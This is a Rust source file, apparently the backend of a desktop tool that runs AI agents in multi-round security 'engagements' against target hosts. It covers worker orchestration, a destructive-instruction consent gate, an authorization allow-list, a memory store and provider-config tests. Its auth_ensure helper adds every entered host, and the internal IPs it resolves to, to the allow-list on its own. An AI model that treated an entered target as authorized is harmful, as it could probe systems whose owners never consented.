                accum.entry(wid.clone()).or_default().push_str(&format!("\n\n--- 추적 라운드 {} ---\n{}", round + 1, o.text));
            }
            {
                let ev = json!({ "type": "note", "text": format!("[sys] 추적 라운드 {} 종료 — 신규 발견 {new_n}건.", round + 1) });
                let stamped = append_event(&app, &id, &ev);
                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
            }
            if new_n == 0 {
                let ev = json!({ "type": "note", "text": "[sys] 수렴 — 추가 발견 없음, collector 로 진행합니다." });
                let stamped = append_event(&app, &id, &ev);
                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
                break;
            }
        }

        // 중단됐으면 collector 없이 마감 (stop_engagement 가 이미 stopped 로 마감했다).
        if is_stopped(&results) {
            return;
        }
        // collector fan-in — 워커 발견(전 라운드 누적)을 시나리오 리포트로 병합.
        let mut combined = String::new();
        let mut ok_n = 0;
        for def in DEEP_WORKERS {
            let wid = def.id;
            let body = accum.get(wid).map(|s| s.trim()).unwrap_or("");
            if !body.is_empty() {
                ok_n += 1;
            }
            let body = if body.is_empty() {
                "(이 워커는 결과를 내지 못했습니다 — collector 가 해당 분야를 보강할 것)".to_string()
            } else {
                body.chars().take(6000).collect::<String>()
            };
            combined.push_str(&format!("\n\n--- {} ({wid}) [라운드 {rounds_run}] ---\n{body}", def.label));
        }
        {
            let ev = json!({ "type": "note", "text": format!("[sys] 워커 {ok_n}/{} 완료({rounds_run}라운드) — collector 가 최종 시나리오 리포트를 병합합니다.", DEEP_WORKERS.len()) });
            let stamped = append_event(&app, &id, &ev);
            app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
        }
        let mut merge = deep_merge_instruction(&target, &goal, &combined, &mem);
        if engine == Engine::Prime {
            merge = prime_adapt(merge);
        }
        merge.push_str(&digest_c);
        let run_tag = if engine == Engine::Prime { "merge".to_string() } else { format!("{piq}-merge") };
        let merge_outcome = match prepare_engine_run(&app, &id, engine, &settings, &provider, &redcell, &run_tag, merge, true) {
            Ok(prep) => match spawn_prepared(&prep, &provider, &settings) {
                Ok((child, pipes)) => {
                    app.state::<Procs>().0.lock().unwrap().insert(id.clone(), child);
                    pump_and_wait(&app, &id, &id, pipes, None, prep.tool_prefix, prep.enforce_auth)
                }
                Err(e) => {
                    emit_note(&app, &id, format!("[오류] collector 실행 실패: {e}"), None);
                    PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false, error: e }
                }
            },
            Err(e) => {
                emit_note(&app, &id, format!("[오류] collector 준비 실패: {e}"), None);
                PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false, error: e }
            }
        };
        let ok = !merge_outcome.failed && !merge_outcome.aborted;
        {
            let ev = json!({ "type": "note", "text": if ok {
                "[완료] 심층 진단 리포트 병합 완료 — 결과 탭에서 확인하세요.".to_string()
            } else if merge_outcome.aborted {
                "[중지] collector 가 중단됐습니다.".to_string()
            } else {
                "[완료] collector 비정상 종료 — 워커 발견은 라이브 캡처에 남아 있습니다.".to_string()
            }});
            let stamped = append_event(&app, &id, &ev);
            app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
        }
        // harness 메모리(prime-agent 패턴): 진단 이력 1줄을 대상별로 누적.
        record_history(&app, &s.host, ok_n, DEEP_WORKERS.len(), ok);
        if let Some(cur) = read_session(&app, &id) {
            if cur.status == "running" {
                let st = if ok { "done" } else { "error" };
                set_status(&app, &id, st);
                app.emit("engagement-status", json!({ "sessionId": id, "status": st })).ok();
            }
        }
    });
    Ok(())
}

#[tauri::command]
/// 파괴적 지시문 게이트 — 실행 진입점 공용. 미동의 파괴 지시는
/// CONSENT_REQUIRED 에러로 막고, Caution 은 주의 노트만 남기고 진행한다.
fn gate_session_instruction(app: &AppHandle, id: &str, s: &Session) -> Result<(), String> {
    match risk::gate_instruction(&s.goal, s.danger_consent) {
        Ok(rep) => {
            if rep.level == risk::RiskLevel::Caution {
                let titles: Vec<String> = rep.concerns.iter().map(|c| c.title.clone()).collect();
                let ev = json!({ "type": "note", "text": format!("[sys] 주의: {} — {}", titles.join("·"), rep.summary) });
                let stamped = append_event(app, id, &ev);
                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
            }
            Ok(())
        }
        Err(e) => Err(e),
    }
}

#[tauri::command]
fn start_engagement(app: AppHandle, id: String) -> Result<(), String> {
    let (s, settings, redcell, provider) = engagement_precheck(&app, &id)?;
    gate_session_instruction(&app, &id, &s)?;
    // 세션 엔진에 따라 pi(-e 확장 게이트) 또는 prime-agent(스킬+킬게이트)로 실행한다.
    // (심층 진단은 start_deep_diagnosis — 병렬 워커 + collector.)
    return match session_engine(&s) {
        Engine::Pi => run_prime(&app, &id, &s, &settings, &redcell, &provider),
        Engine::Prime => run_prime_agent(&app, &id, &s, &settings, &provider),
    };
}
/// 실행 중지 — 등록된 자식 프로세스(심층 워커 `{id}#w{n}` 포함)를 kill 하고 stopped 로 마감한다.
/// P0 스윕 중·라운드 사이처럼 등록된 자식이 없는 구간에서도 status 가 running 이면
/// stopped 로 전이한다 — 그래야 심층 진단 스레드가 다음 단계(워커/collector)를
/// 시작하지 않고 바로 마감한다. (자식 없이 running 도 아닌 경우에만 Err.)
#[tauri::command]
fn stop_engagement(app: AppHandle, id: String) -> Result<(), String> {
    let keys: Vec<String> = {
        let procs = app.state::<Procs>();
        let reg = procs.0.lock().unwrap();
        reg.keys()
            .filter(|k| *k == &id || k.starts_with(&format!("{id}#")))
            .cloned()
            .collect()
    };
    if keys.is_empty() {
        let running = read_session(&app, &id).map(|s| s.status == "running").unwrap_or(false);
        if !running {
            return Err("실행 중인 세션이 아닙니다".into());
        }
        // 자식은 없지만 실행 상태(P0 스윕·라운드 사이) — 아래에서 stopped 로 마감한다.
    }
    for k in keys {
        let removed = app.state::<Procs>().0.lock().unwrap().remove(&k);
        if let Some(mut child) = removed {
            let _ = child.kill();
            let _ = child.wait();
        }
    }

    let ev = json!({ "type": "note", "text": "[중지] 사용자가 실행을 중지했습니다." });
    let stamped = append_event(&app, &id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped }))
        .ok();
    set_status(&app, &id, "stopped");
    app.emit(
        "engagement-status",
        json!({ "sessionId": id, "status": "stopped" }),
    )
    .ok();
    Ok(())
}

// ── 인가 목록(ip-list) — UI 에서 IP 추가/제거 ──────────────────────────────────
// 경로 해석: ⚙ 설정의 auth_path(상대 경로는 redcell_dir 기준) → 없으면 기본
// ~/.redcell/authorization.list. redcell CLI 의 findAuthPath 우선순위와 일치한다.
fn resolve_app_auth_path(app: &AppHandle) -> std::path::PathBuf {
    let s = get_settings(app.clone());
    let p = s.auth_path.trim();
    if p.is_empty() {
        return auth::default_list_path();
    }
    let pb = std::path::PathBuf::from(p);
    if pb.is_absolute() {
        return pb;
    }
    if !s.redcell_dir.trim().is_empty() {
        let d = std::path::PathBuf::from(s.redcell_dir.trim());
        if d.is_absolute() {
            return d.join(pb);
        }
    }
    std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from(".")).join(pb)
}

#[tauri::command]
fn list_auth(app: AppHandle) -> auth::AuthList {
    auth::load(&resolve_app_auth_path(&app))
}

#[tauri::command]
fn add_auth(app: AppHandle, target: String, deny: bool) -> Result<auth::AuthList, String> {
    let path = resolve_app_auth_path(&app);
    auth::add(&path, &target, deny)?;
    Ok(auth::load(&path))
}

#[tauri::command]
fn remove_auth(app: AppHandle, target: String) -> Result<auth::AuthList, String> {
    let path = resolve_app_auth_path(&app);
    auth::remove(&path, &target)?;
    Ok(auth::load(&path))
}

/// 실행 전 자동 인가 — 입력한 host/URL 을 허용 목록에 추가하고 결과를 알린다.
/// (파일이 정식 YAML 이면 아무것도 건드리지 않고 yaml=true 만 알린다 — 게이트는 엔진이 수행)
///
/// "URL 입력 = 그 대상 인가" 계약을 이름뿐 아니라 실제 접속 IP 까지 채운다: host 를 DNS 로
/// 해석해 나온 IP 도 함께 목록에 추가한다. 그래야 엔진 ScopeGuard 의 연결시점 IP 검증
/// (checkResolvedIp) 을 통과한다 — 특히 사설 대역(10.x 등 사내망 호스트)으로 해석되는
/// 대상은 IP 가 명시 인가돼 있지 않으면 측면이동 방지 기본값에 막히므로, 실행할 때마다
/// "가 인가 IP 로 해석되지 않습니다" 오류가 났었다.
#[derive(serde::Serialize)]
struct AuthEnsureResult {
    added: bool,
    existed: bool,
    host: String,
    path: String,
    yaml: bool,
    reason: Option<String>,
    /// 이번에 DNS 해석해 새로 추가한 IP 목록.
    ips_added: Vec<String>,
    /// 이미 목록에 있던 IP 목록(재추가 안 함).
    ips_known: Vec<String>,
}

#[tauri::command]
fn auth_ensure(app: AppHandle, host: String) -> Result<AuthEnsureResult, String> {
    let path = resolve_app_auth_path(&app);
    let normalized = auth::normalize_host(&host);
    let loaded = auth::load(&path);
    if loaded.yaml {
        return Ok(AuthEnsureResult {
            added: false,
            existed: false,
            host: normalized,
            path: loaded.path,
            yaml: true,
            reason: Some("인가 파일이 정식 YAML 입니다 — 자동 추가하지 않습니다.".into()),
            ips_added: vec![],
            ips_known: vec![],
        });
    }
    let host_added = if loaded.allows.iter().any(|a| a == &normalized) {
        false
    } else {
        auth::ensure_allowed(&path, &host)?;
        true
    };

    // DNS 해석 → 해석된 IP 도 허용 목록에 (중복 제외).
    // 해석 실패(오프라인/존재하지 않는 이름)면 조용히 이름만 추가하고 넘어간다 —
    // 엔진이 실행 시점에 다시 검증한다(fail-closed 유지).
    let (ips_added, ips_known) = auth::resolve_and_allow(&path, &normalized, &loaded.allows);
    Ok(AuthEnsureResult {
        added: host_added,
        existed: !host_added,
        host: normalized,
        path: auth::load(&path).path,
        yaml: false,
        reason: None,
        ips_added,
        ips_known,
    })
}

/// 진단/정리 리포트(MD)를 앱 데이터 폴더의 reports/ 에 저장하고 절대 경로를 돌려준다.
/// 파일명은 사용자 제공 이름을 위생 처리해 경로 주입·잘못된 문자를 막는다.
#[tauri::command]
fn write_report(app: AppHandle, name: String, content: String, format: Option<String>) -> Result<String, String> {
    let dir = root(&app).join("reports");
    fs::create_dir_all(&dir).map_err(|e| format!("보고서 폴더 생성 실패: {e}"))?;
    let base = name.trim();
    let base = if base.is_empty() {
        "report".to_string()
    } else {
        sanitize_filename(base)
    };
    let ext = match format.as_deref() {
        Some("html") => "html",
        _ => "md",
    };
    let file = dir.join(format!(
        "{}-{}.{}",
        Utc::now().format("%Y%m%d-%H%M%S"),
        base,
        ext
    ));
    fs::write(&file, content).map_err(|e| format!("보고서 저장 실패: {e}"))?;
    Ok(file.to_string_lossy().into_owned())
}

/// 파일명 위생 처리: 경로 구분자와 이상한 문자가 섞이지 않게 알파벳·숫자·한글·공백만 남긴다.
fn sanitize_filename(raw: &str) -> String {
    let mut out = String::new();
    let mut prev_space = false;
    for c in raw.trim().chars() {
        let ok = c.is_alphanumeric() || c.is_whitespace() || matches!(c, '-' | '_');
        if ok && c.is_whitespace() {
            if !prev_space {
                out.push(' ');
                prev_space = true;
            }
            continue;
        }
        if ok {
            out.push(c);
            prev_space = false;
        }
    }
    let v: String = out.chars().take(80).collect();
    if v.trim().is_empty() {
        "report".into()
    } else {
        v.trim().to_string()
    }
}

/// host 를 DNS 해석해 나온 IP 를 인가 목록에 추가한다. 반환: (새로 추가한 IP, 이미 있던 IP).
// ── 진단 메모리(harness memory) — prime-agent Continual Harness 패턴의 경량 구현 ──
// 전역 메모 + 대상별 메모를 앱 데이터 memory.json 에 누적하고, 진단 지시문에 주입한다.
// kind: note(사용자 메모) | history(심층 진단 이력 자동 기록) | fix(조치 확인됨).
#[derive(Serialize, Deserialize, Clone)]
struct MemoryNote {
    id: String,
    ts: String,
    #[serde(default)]
    host: String, // 빈 문자열 = 전역
    #[serde(default)]
    kind: String,
    text: String,
}

fn memory_file(app: &AppHandle) -> PathBuf {
    root(app).join("memory.json")
}

fn load_memory(app: &AppHandle) -> Vec<MemoryNote> {
    fs::read_to_string(memory_file(app))
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default()
}

fn save_memory(app: &AppHandle, notes: &[MemoryNote]) {
    if let Ok(txt) = serde_json::to_string_pretty(notes) {
        fs::write(memory_file(app), txt).ok();
    }
}

/// 진단 지시문에 주입하는 메모리 블록 (전역 + 해당 대상, 최신 8건, 건당 300자).
fn memory_block(app: &AppHandle, host: &str) -> String {
    let notes = load_memory(app);
    let host = host.trim().to_lowercase();
    let picked: Vec<&MemoryNote> = notes
        .iter()
        .filter(|n| n.host.trim().is_empty() || (!host.is_empty() && n.host.trim().to_lowercase() == host))
        .collect();
    if picked.is_empty() {
        return String::new();
    }
    let mut out = String::from("## 과거 진단 메모 (이번 진단에 반영할 것)\n");
    for n in picked.iter().rev().take(8) {
        let t: String = n.text.chars().take(300).collect();
        out.push_str(&format!("- [{}] {}\n", n.kind, t.trim()));
    }
    out
}

/// 심층 진단 완료 후 이력 1줄 자동 기록 (대상별 history 5건·전체 300건 상한).
fn record_history(app: &AppHandle, host: &str, ok_n: usize, total: usize, ok: bool) {
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    let mut notes = load_memory(app);
    // 같은 대상 history 는 최근 4건만 남긴다.
    let mut kept_hist: Vec<MemoryNote> = notes
        .iter()
        .filter(|n| n.kind == "history" && n.host == host)
        .cloned()
        .collect();
    kept_hist.sort_by(|a, b| b.ts.cmp(&a.ts));
    kept_hist.truncate(4);
    notes.retain(|n| !(n.kind == "history" && n.host == host));
    notes.extend(kept_hist);
    let day = now().chars().take(10).collect::<String>();
    notes.push(MemoryNote {
        id: Uuid::new_v4().to_string(),
        ts: now(),
        host: host.to_string(),
        kind: "history".into(),
        text: format!(
            "심층진단 {day} — 워커 {ok_n}/{total} 성공, 리포트 병합 {}.",
            if ok { "성공" } else { "실패" }
        ),
    });
    // 전체 상한: 오래된 history 부터 제거.
    while notes.len() > 300 {
        if let Some(pos) = notes.iter().position(|n| n.kind == "history") {
            notes.remove(pos);
        } else {
            break;
        }
    }
    save_memory(&app, &notes);
}

#[tauri::command]
fn get_memory(app: AppHandle, host: String) -> Value {
    let notes = load_memory(&app);
    let h = host.trim().to_lowercase();
    let global: Vec<&MemoryNote> = notes.iter().filter(|n| n.host.trim().is_empty()).collect();
    let mine: Vec<&MemoryNote> =
        notes.iter().filter(|n| !n.host.trim().is_empty() && n.host.trim().to_lowercase() == h).collect();
    json!({ "global": global, "host": mine })
}

#[tauri::command]
fn add_memory(app: AppHandle, host: String, kind: String, text: String) -> Result<Value, String> {
    let text = text.trim();
    if text.is_empty() {
        return Err("메모 내용을 입력하세요.".into());
    }
    if text.chars().count() > 2000 {
        return Err("메모는 2000자 이내로 입력하세요.".into());
    }
    let kind = match kind.trim() {
        "note" | "fix" | "history" => kind.trim().to_string(),
        "" => "note".to_string(),
        other => return Err(format!("알 수 없는 메모 종류: {other}")),
    };
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    let mut notes = load_memory(&app);
    notes.push(MemoryNote {
        id: Uuid::new_v4().to_string(),
        ts: now(),
        host: host.trim().to_string(),
        kind,
        text: text.to_string(),
    });
    save_memory(&app, &notes);
    Ok(json!({ "ok": true, "count": notes.len() }))
}

#[tauri::command]
fn remove_memory(app: AppHandle, id: String) -> Result<Value, String> {
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    let mut notes = load_memory(&app);
    let before = notes.len();
    notes.retain(|n| n.id != id);
    if notes.len() == before {
        return Err("메모를 찾을 수 없습니다.".into());
    }
    save_memory(&app, &notes);
    Ok(json!({ "ok": true, "count": notes.len() }))
}

/// prime-agent 버전 조회 — `--version` 첫 줄 (3초 타임아웃).
fn prime_version(bin: &Path) -> Option<String> {
    let mut probe = Command::new(bin);
    probe.arg("--version").stdout(Stdio::piped()).stderr(Stdio::null());
    hide_window(&mut probe);
    let mut child = probe.spawn().ok()?;
    let mut waited = 0;
    loop {
        if child.try_wait().ok()??.success() {
            use std::io::Read;
            let mut out = String::new();
            if let Some(mut o) = child.stdout.take() {
                let _ = o.read_to_string(&mut out);
            }
            let v = out.lines().next().unwrap_or("").trim().to_string();
            return if v.is_empty() { None } else { Some(v) };
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
        waited += 100;
        if waited > 3000 {
            let _ = child.kill();
            return None;
        }
    }
}

/// 엔진 감지 — pi-coding-agent + prime-agent(Rust 하네스 직접 실행) 설치 상태·버전.
#[tauri::command]
fn detect_engines(app: AppHandle) -> Value {
    let settings = get_settings(app);
    let pi = prime_cli_path(&settings.redcell_dir)
        .map(|p| p.to_string_lossy().into_owned())
        .ok();
    let prime_path = prime_agent_path().ok();
    let prime_version = prime_path.as_deref().and_then(prime_version);
    json!({
        "pi": { "found": pi.is_some(), "path": pi },
        "prime_agent": { "found": prime_path.is_some(), "path": prime_path.map(|p| p.to_string_lossy().into_owned()), "version": prime_version },
    })
}

fn main() {
    tauri::Builder::default()
        .manage(IoGuard(Mutex::new(())))
        .manage(Procs(Mutex::new(HashMap::new())))
        .invoke_handler(tauri::generate_handler![
            get_settings,
            save_settings,
            list_sessions,
            get_session,
            create_session,
            update_session,
            set_danger_consent,
            delete_session,
            append_chat,
            start_engagement,
            start_deep_diagnosis,
            stop_engagement,
            get_memory,
            add_memory,
            remove_memory,
            detect_engines,
            list_auth,
            add_auth,
            remove_auth,
            auth_ensure,
            get_providers,
            test_provider,
            write_report
        ])
        .run(tauri::generate_context!())
        .expect("RedCell Desktop 실행 중 오류");
}

#[cfg(test)]
mod tests {
    use super::*;

    /// 회귀 테스트: pi CLI(prime-agent) 경로 탐색은 nvm 전역 설치를 포함해 반드시 찾는다.
    /// (이 환경: HOME/.nvm/versions/node/*/lib/node_modules/... — 과거엔 못 찾아
    ///  "prime-agent(pi) 를 찾을 수 없습니다" 가 났다.)
    static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    #[test]
    fn prime_cli_path_finds_pi_installation() {
        let _g = ENV_LOCK.lock().unwrap();
        let redcell = std::env::current_dir()
            .unwrap()
            .ancestors()
            .find(|p| p.join("src").join("cli.ts").exists())
            .map(|p| p.to_path_buf())
            .or_else(|| std::env::var("REDCELL_DIR").ok().map(PathBuf::from))
            .unwrap_or_else(|| PathBuf::from("/opt/workspace/local/bsh/workspace/absolute-agent/redcell"));
        let found = prime_cli_path(&redcell.to_string_lossy());
        assert!(found.is_ok(), "pi CLI 를 찾아야 한다 (nvm/pnpm/bun/npm root -g 탐색) — {found:?}");
        let p = found.unwrap();
        assert!(p.is_file(), "찾은 경로가 실제 파일이어야 한다: {p:?}");
        assert!(p.to_string_lossy().contains("pi-coding-agent"), "pi-coding-agent 경로여야 한다: {p:?}");
    }

    /// Windows 실사용 시나리오 재현: HOME 미설정이어도 USERPROFILE·APPDATA·LOCALAPPDATA·
    /// ProgramFiles 기반 후보가 생성되고, PATH 에 pi.cmd shim 만 있으면 해석되어야 한다.
    #[test]
    fn prime_cli_candidates_windows_layout() {
        let _g = ENV_LOCK.lock().unwrap();
        // 사용자 Windows PC 실사용 재현(HOME 미설정, USERPROFILE/APPDATA 만 존재).
        let saved = [
            ("HOME", std::env::var_os("HOME")),
            ("USERPROFILE", std::env::var_os("USERPROFILE")),
            ("APPDATA", std::env::var_os("APPDATA")),
            ("LOCALAPPDATA", std::env::var_os("LOCALAPPDATA")),
            ("ProgramFiles", std::env::var_os("ProgramFiles")),
            ("REDCELL_PI_DIR", std::env::var_os("REDCELL_PI_DIR")),
            ("PI_PACKAGE_DIR", std::env::var_os("PI_PACKAGE_DIR")),
        ];
        let restore = |saved: &[(&str, Option<std::ffi::OsString>)]| {
            for (k, v) in saved {
                match v {
                    Some(v) => std::env::set_var(k, v),
                    None => std::env::remove_var(k),
                }
            }
        };
        std::env::remove_var("HOME");
        std::env::set_var("USERPROFILE", "C:\\Users\\HP");
        std::env::set_var("APPDATA", "C:\\Users\\HP\\AppData\\Roaming");
        std::env::set_var("LOCALAPPDATA", "C:\\Users\\HP\\AppData\\Local");
        std::env::set_var("ProgramFiles", "C:\\Program Files");
        let cands = prime_cli_candidates("C:\\workspace\\redcell");
        // 구분자 평준화(\\ → /) 후 포함 검사로 OS 횡단 검증.
        let norm = |s: &str| s.to_lowercase().replace('\\', "/");
        let joined = norm(&cands.iter().map(|c| c.display().to_string()).collect::<Vec<_>>().join(" | "));
        for frag in [
            "c:/users/hp/appdata/roaming/npm/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
            "c:/users/hp/appdata/local/pnpm/global/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
            "c:/users/hp/appdata/local/programs/nodejs/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
            "c:/program files/nodejs/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
            "c:/users/hp/appdata/roaming/nvm/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
            "c:/users/hp/npm-global/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
            "c:/users/hp/.bun/install/global/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
        ] {
            assert!(joined.contains(frag), "후보 누락: {frag}\n전체: {joined}");
        }
        // pi 가 실제로 설치된 머신에서는 Ok(파일)가 돌아오고, 없으면 진단 에러에
        // USERPROFILE 이 표시된다(Windows 실사용 시나리오).
        match prime_cli_path("C:\\workspace\\redcell") {
            Ok(p) => assert!(p.is_file(), "발견 경로가 파일이어야 한다: {p:?}"),
            Err(diag) => assert!(diag.contains("USERPROFILE"), "진단에 USERPROFILE 포함 필요: {diag}"),
        }
        restore(&saved);
    }

    /// models.json 병합: 기존 프로바이더는 보존, custom/ollama 는 baseUrl·apiKey·models
    /// 가 기록되고, 같은 모델 재호출 시 중복이 생기지 않아야 한다(pi 커스텀 프로바이더의
    /// "No API key found / Unknown provider" 문제의 직접 회귀 테스트).
    #[test]
    fn sync_pi_models_json_merges_and_upserts() {
        let dir = std::env::temp_dir().join(format!("rc-models-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("models.json");
        std::fs::write(
            &path,
            r#"{"providers":{"databricks":{"baseUrl":"https://db.example","api":"openai-completions","apiKey":"keep-me","models":[{"id":"db-model"}]}}}"#,
        )
        .unwrap();
        // 첫 호출: custom 신규 추가.
        sync_pi_models_json_at(&path, "custom", "http://llm.corp.lge:8080/v1", "sk-test", "my-model", "").unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        let providers = root["providers"].as_object().unwrap();
        // 기존 프로바이더 보존.
        assert_eq!(providers["databricks"]["apiKey"], "keep-me");
        assert_eq!(providers["databricks"]["models"][0]["id"], "db-model");
        // custom 필드 기록.
        assert_eq!(providers["custom"]["baseUrl"], "http://llm.corp.lge:8080/v1");
        assert_eq!(providers["custom"]["apiKey"], "sk-test");
        assert_eq!(providers["custom"]["api"], "openai-completions");
        assert_eq!(providers["custom"]["models"][0]["id"], "my-model");
        // 보수적 OpenAI 호환 기본값 — stream_options/include_usage 를 모르는 게이트웨이의
        // "400 status code (no body)" 회귀 방식.
        assert_eq!(providers["custom"]["compat"]["supportsUsageInStreaming"], false);
        assert_eq!(providers["custom"]["compat"]["supportsStore"], false);
        assert_eq!(providers["custom"]["compat"]["supportsDeveloperRole"], false);
        // 두 번째 호출: 같은 모델 중복 없음 + 새 모델 추가.
        sync_pi_models_json_at(&path, "custom", "http://llm.corp.lge:8080/v1", "sk-test", "my-model", "").unwrap();
        sync_pi_models_json_at(&path, "custom", "http://llm.corp.lge:8080/v1", "sk-test", "second-model", "").unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        let models = root["providers"]["custom"]["models"].as_array().unwrap();
        assert_eq!(models.len(), 2, "모델은 업서트(중복 없이 2개)여야 한다: {models:?}");
        assert_eq!(models[1]["id"], "second-model");
        // 모델 없는 새 프로바이더는 오류.
        let err = sync_pi_models_json_at(&path, "ollama", "http://localhost:11434/v1", "x", "", "").unwrap_err();
        assert!(err.contains("모델"), "모델 미지정 시 안내 오류: {err}");
        // 키 미설정이어도 placeholder 로 프로바이더가 살아남는다.
        sync_pi_models_json_at(&path, "ollama", "http://localhost:11434/v1", "", "llama3.1", "").unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(root["providers"]["ollama"]["apiKey"], "redcell-placeholder");
        assert_eq!(root["providers"]["ollama"]["models"][0]["id"], "llama3.1");
        std::fs::remove_dir_all(&dir).ok();
    }

    /// 기본 내장 연결(lge-aigw): 설정이 비어도 카탈로그 기본 base URL(MLflow Responses)·
    /// openai-responses 방언으로 동기화되고, 모델 메타데이터가 기록되어야 한다 —
    /// 셸 명령 키(`!ug auth-token`) 없이 붙여넣은 토큰(--api-key)으로 쓰는 직접 회귀 테스트.
    #[test]
    fn sync_pi_models_json_lge_aigw_defaults() {
        let dir = std::env::temp_dir().join(format!("rc-models-aigw-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("models.json");
        let conn = ProviderConn {
            api_key: "dbcsi-abc123".into(),
            base_url: String::new(), // 시딩된 기본값 — 카탈로그 base URL 로 폴백
            model: "system.ai.glm-5-3-flash".into(),
            api: "openai-responses".into(),
        };
        sync_pi_models_json_at(
            &path,
            "lge-aigw",
            &sync_base_url("lge-aigw", &conn),
            &conn.api_key,
            &conn.model,
            &sync_api("lge-aigw", &conn),
        )
        .unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        let aigw = &root["providers"]["lge-aigw"];
        assert_eq!(
            aigw["baseUrl"],
            "https://lge-esdatapf.cloud.databricks.com/ai-gateway/mlflow/v1",
            "빈 base_url 은 카탈로그 기본값으로: {aigw}"
        );
        assert_eq!(aigw["api"], "openai-responses");
        assert!(aigw.get("authHeader").is_none(), "responses 방언은 Bearer 기본 — authHeader 불필요: {aigw}");
        assert_eq!(aigw["apiKey"], "dbcsi-abc123", "붙여넣은 토큰은 그대로 기록");
        assert_eq!(aigw["models"][0]["id"], "system.ai.glm-5-3-flash");
        assert_eq!(aigw["models"][0]["reasoning"], true);
        assert!(aigw["models"][0]["maxTokens"].as_u64().unwrap_or(0) >= 8192, "thinking 상한 확보");
        std::fs::remove_dir_all(&dir).ok();
    }

    /// custom + Anthropic 방식(Databricks AI Gateway): api 방언·authHeader·compat 가
    /// 기록되고 `!명령` 키가 그대로 통과해야 한다. OpenAI 방언으로 되돌리면 게이트웨이
    /// 전용 필드는 제거된다.
    #[test]
    fn sync_pi_models_json_anthropic_dialect_and_bang_key() {
        let dir = std::env::temp_dir().join(format!("rc-models-anthropic-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("models.json");
        sync_pi_models_json_at(
            &path,
            "custom",
            "https://ws.example.cloud.databricks.com/ai-gateway/anthropic",
            "!ug auth-token --host https://ws.example --profile test",
            "system.ai.claude-sonnet-5-5",
            "anthropic-messages",
        )
        .unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        let custom = &root["providers"]["custom"];
        assert_eq!(custom["api"], "anthropic-messages");
        assert_eq!(custom["authHeader"], true);
        assert_eq!(custom["compat"]["supportsEagerToolInputStreaming"], false);
        assert_eq!(custom["apiKey"], "!ug auth-token --host https://ws.example --profile test");
        assert_eq!(custom["models"][0]["id"], "system.ai.claude-sonnet-5-5");
        // 사용자가 compat 을 직접 쓰면 그 값을 존중한다(기본값으로 덮지 않는다).
        sync_pi_models_json_at(&path, "custom", "https://ws.example/ai-gateway/anthropic", "!ug auth-token", "m", "anthropic-messages").unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(root["providers"]["custom"]["compat"]["supportsEagerToolInputStreaming"], false);
        // OpenAI 방언으로 전환 — 게이트웨이 전용 필드 제거 + 보수적 기본값, 키·모델·사용자
        // compat 값은 유지.
        sync_pi_models_json_at(&path, "custom", "http://llm.local/v1", "sk-x", "local-model", "openai-completions").unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        let custom = &root["providers"]["custom"];
        assert_eq!(custom["api"], "openai-completions");
        assert!(custom.get("authHeader").is_none(), "authHeader 잔재: {custom}");
        assert!(
            custom["compat"]["supportsEagerToolInputStreaming"].is_null(),
            "anthropic 전용 compat 잔재: {custom}"
        );
        assert_eq!(custom["compat"]["supportsUsageInStreaming"], false, "보수적 기본값");
        assert_eq!(custom["apiKey"], "sk-x");
        std::fs::remove_dir_all(&dir).ok();
    }

    /// Windows npm 전역 설치(%APPDATA%\npm\node_modules\...)를 실제 파일로 만들고
    /// prime_cli_path 가 정말 찾는지 end-to-end 확인.
    #[test]
    fn prime_cli_path_finds_windows_global_npm_install() {
        let _g = ENV_LOCK.lock().unwrap();
        let saved = [
            ("HOME", std::env::var_os("HOME")),
            ("USERPROFILE", std::env::var_os("USERPROFILE")),
            ("APPDATA", std::env::var_os("APPDATA")),
            ("REDCELL_PI_DIR", std::env::var_os("REDCELL_PI_DIR")),
            ("PI_PACKAGE_DIR", std::env::var_os("PI_PACKAGE_DIR")),
        ];
        std::env::remove_var("HOME");
        let fake = std::env::temp_dir().join(format!("redcell-pi-{}", std::process::id()));
        let cli = fake
            .join("npm")
            .join("node_modules")
            .join("@earendil-works")
            .join("pi-coding-agent")
            .join("dist")
            .join("cli.js");
        std::fs::create_dir_all(cli.parent().unwrap()).unwrap();
        std::fs::write(&cli, "// fake pi cli for test
").unwrap();
        std::env::set_var("APPDATA", &fake);
        std::env::remove_var("USERPROFILE");
        std::env::set_var("LOCALAPPDATA", fake.join("Local"));
        let found = prime_cli_path("C:\\workspace\\redcell");
